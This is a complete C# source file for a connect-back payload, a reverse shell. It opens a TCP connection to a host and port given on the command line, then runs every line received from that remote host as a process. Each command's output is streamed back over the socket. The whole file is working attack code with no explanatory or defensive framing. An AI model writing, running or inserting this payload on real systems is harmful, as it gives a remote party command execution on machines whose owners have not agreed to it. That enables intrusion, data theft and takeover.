using System.Text;
using System.Net.Sockets;
using System;
using System.IO;
using System.Linq;
using System.Diagnostics;

namespace ConnectBackPayload
{
    class Program
    {
        static void Main(string[] args)
        {
            using (TcpClient client = new TcpClient(args[0], int.Parse(args[1])))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        while (true)
                        {
                            string cmd = reader.ReadLine();

                            if (string.IsNullOrEmpty(cmd))
                            {
                                reader.Close();
                                stream.Close();
                                client.Close();
                                return;
                            }

                            if (string.IsNullOrWhiteSpace(cmd))
                            {
                                continue;
                            }

                            string[] split = cmd.Trim().Split(' ');
                            string filename = split.First();
                            string arg = string.Join(" ", split.Skip(1));

                            try
                            {
                                Process prc = new Process();
                                prc.StartInfo = new ProcessStartInfo();
                                prc.StartInfo.FileName = filename;
                                prc.StartInfo.Arguments = arg;
                                prc.StartInfo.UseShellExecute = false;
                                prc.StartInfo.RedirectStandardOutput = true;
                                prc.Start();
                                prc.StandardOutput.BaseStream.CopyTo(stream);
                                prc.WaitForExit();
                            }
                            catch
                            {
                                string error = $"Error running command {cmd}{Environment.NewLine}";
                                byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                stream.Write(errorBytes, 0, errorBytes.Length);
                            }
                        }
                    }
                }
            }
        }
    }
}
